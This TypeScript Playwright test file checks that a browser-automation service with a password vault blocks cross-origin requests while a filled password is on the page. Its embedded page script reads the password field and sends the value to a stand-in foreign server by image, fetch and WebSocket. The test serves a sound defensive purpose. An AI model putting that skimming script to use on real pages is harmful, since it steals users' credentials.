import { randomBytes } from 'node:crypto'
import { mkdtempSync } from 'node:fs'
import { createServer, type Server } from 'node:http'
import type { AddressInfo } from 'node:net'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Readable } from 'node:stream'
import { expect, test } from '@playwright/test'
import { startBrowserService } from '../../src/service/start.js'
import { loginVaultPath, openLoginVault } from '../../src/vault/index.js'
import { refOf, type BrowserResult } from './helpers.js'

// Скрипт на разрешённом сайте читает вписанный пароль и уносит его на чужой сайт запросом GET (картинка, fetch,
// WebSocket). Пока пароль на странице, запросы на сайты вне allowedOrigins закрыты; на новой странице — снова открыты.

const PASSWORD = `exfil-${randomBytes(8).toString('hex')}`

async function listen(server: Server): Promise<string> {
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  return `http://127.0.0.1:${(server.address() as AddressInfo).port}`
}

test('пароль на странице не уходит на чужой сайт ни картинкой, ни fetch, ни WebSocket', async () => {
  const stolen: string[] = []
  const foreign = createServer((request, response) => {
    stolen.push(request.url ?? '')
    response.writeHead(200, { 'content-type': 'image/gif', 'access-control-allow-origin': '*' })
    response.end()
  })
  foreign.on('upgrade', (request, socket) => {
    stolen.push(`ws:${request.url ?? ''}`)
    socket.destroy()
  })
  // Чужой сайт — тот же адрес, но через `localhost`: другой origin.
  const foreignUrl = (await listen(foreign)).replace('127.0.0.1', 'localhost')

  const leakScript = `
    const steal = (value) => {
      new Image().src = '${foreignUrl}/img?p=' + encodeURIComponent(value)
      fetch('${foreignUrl}/fetch?p=' + encodeURIComponent(value), { mode: 'no-cors' }).catch(() => {})
      try { new WebSocket('${foreignUrl.replace('http', 'ws')}/ws?p=' + encodeURIComponent(value)) } catch {}
    }
    document.querySelector('input[type=password]')?.addEventListener('input', (event) => steal(event.target.value))
  `
  const site = createServer((request, response) => {
    response.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
    if (request.url === '/login') {
      response.end(`<!doctype html><title>Вход</title><label>Пароль <input type="password" name="password"></label><script>${leakScript}</script>`)
    } else {
      response.end(`<!doctype html><title>Кабинет</title><img src="${foreignUrl}/after-login.gif">`)
    }
  })
  const siteUrl = await listen(site)

  const dataDir = mkdtempSync(join(tmpdir(), 'remontnik-browser-exfil-'))
  const vaultKey = randomBytes(32)
  const entry = await openLoginVault({ file: loginVaultPath(dataDir), key: vaultKey }).add({ site: siteUrl, login: 'owner', profile: 'remontnik' }, Readable.from([Buffer.from(PASSWORD)]))
  const logs: string[] = []
  const token = randomBytes(24).toString('hex')
  const service = await startBrowserService({
    token,
    vaultKey,
    dataDir,
    policy: { allowedOrigins: [siteUrl], allowedMutations: [], profiles: [{ name: 'remontnik' }] },
    listen: { host: '127.0.0.1', port: 0 },
    live: null,
    log: (line) => logs.push(line),
  })
  const call = async (command: string, body: Record<string, unknown> = {}): Promise<BrowserResult> => {
    const response = await fetch(`${service.url}/v1/${command}`, {
      method: 'POST',
      headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ profile: 'remontnik', ...body }),
    })
    return (await response.json()) as BrowserResult
  }

  try {
    const login = await call('url', { url: `${siteUrl}/login` })
    expect(login).toMatchObject({ ok: true, title: 'Вход' })
    // Пароль вписан, но страница пыталась унести его: действие сообщает об этом модели, как о любом запросе под замком.
    expect(await call('fill-password', { entryId: entry.id, ref: refOf(login.snapshot, 'textbox', 'Пароль') })).toMatchObject({ ok: false, code: 'refused_leak' })

    await expect.poll(() => logs.filter((line) => line.includes('refused_leak')).length).toBeGreaterThanOrEqual(2)
    // Сокет мог бы прийти чуть позже запросов: ждём, пока страница точно успела попытаться.
    await call('read')
    expect(stolen).toEqual([])

    // Новая страница без пароля: подресурсы с других сайтов снова грузятся.
    expect(await call('url', { url: `${siteUrl}/cabinet` })).toMatchObject({ ok: true, title: 'Кабинет' })
    await expect.poll(() => stolen).toEqual(['/after-login.gif'])
  } finally {
    await service.close()
    site.close()
    foreign.close()
  }
})
